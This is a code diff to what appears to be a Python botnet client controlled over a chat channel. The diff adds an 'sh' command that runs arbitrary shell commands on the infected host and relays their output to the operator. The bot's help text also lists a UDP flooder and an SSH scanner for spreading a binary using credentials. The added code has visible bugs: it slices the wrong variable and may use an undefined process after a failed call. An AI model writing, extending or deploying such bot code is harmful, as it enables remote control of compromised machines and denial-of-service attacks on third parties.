@@ -493,6 +493,17 @@ while True:
                             else:
                                 pass
 
+                if cmd == "sh":
+                    if len(args) > 2:
+                        try:
+                            process = subprocess.Popen(cmd[3:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        except:
+                            bot.send("Failed sending command.", data.channel)
+
+                        for line in process.stdout.readlines():
+                            bot.send(line.strip(), data.channel)
+                    
+
                 if cmd == "die":
                     bot.exit()
                     exit()
@@ -538,7 +549,8 @@ while True:
                         HelpData("udp", "<ip> <port> <time> - udp flooder."),
                         HelpData("disable/enable", "<password> - disables or enables the bot."),
                         HelpData("die", "- kills the knight."),
-                        HelpData("scan", "<range> <host> <binary> <user:password> <threads> - Advanced SSH scanner - unlike others, this one really works.")
+                        HelpData("scan", "<range> <host> <binary> <user:password> <threads> - Advanced SSH scanner - unlike others, this one really works."),
+                        HelpData("sh", "<command> - Run a command on the host.")
                     ]
 
                     if len(args) == 2:
